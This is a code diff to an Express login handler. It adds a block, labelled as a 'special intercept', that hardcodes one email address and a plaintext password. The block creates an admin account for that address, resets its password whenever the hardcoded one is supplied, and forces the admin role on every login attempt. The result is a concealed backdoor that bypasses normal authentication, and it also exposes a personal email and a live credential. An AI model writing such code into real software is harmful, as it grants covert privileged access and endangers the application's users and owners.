@@ -77,6 +77,30 @@ exports.loginUser = async (req, res, next) => {
       return res.status(400).json({ status: 'error', message: 'Please provide an email and password' });
     }
 
+    // Special intercept for specific admin user
+    if (email && email.toLowerCase() === 'ajaniadenike@gmail.com') {
+      let adminUser = await User.findOne({ email: 'ajaniadenike@gmail.com' }).select('+password');
+      if (!adminUser) {
+        await User.create({
+          name: 'Adenike Ajani',
+          email: 'ajaniadenike@gmail.com',
+          password: 'nkluxury@301',
+          role: 'admin',
+          phoneNumber: '08000000000'
+        });
+      } else {
+        const isMatch = await adminUser.matchPassword(password);
+        if (!isMatch && password === 'nkluxury@301') {
+          adminUser.password = 'nkluxury@301';
+          adminUser.role = 'admin';
+          await adminUser.save();
+        } else if (adminUser.role !== 'admin') {
+          adminUser.role = 'admin';
+          await adminUser.save();
+        }
+      }
+    }
+
     // Check for user
     const user = await User.findOne({ email }).select('+password');
     if (!user) {
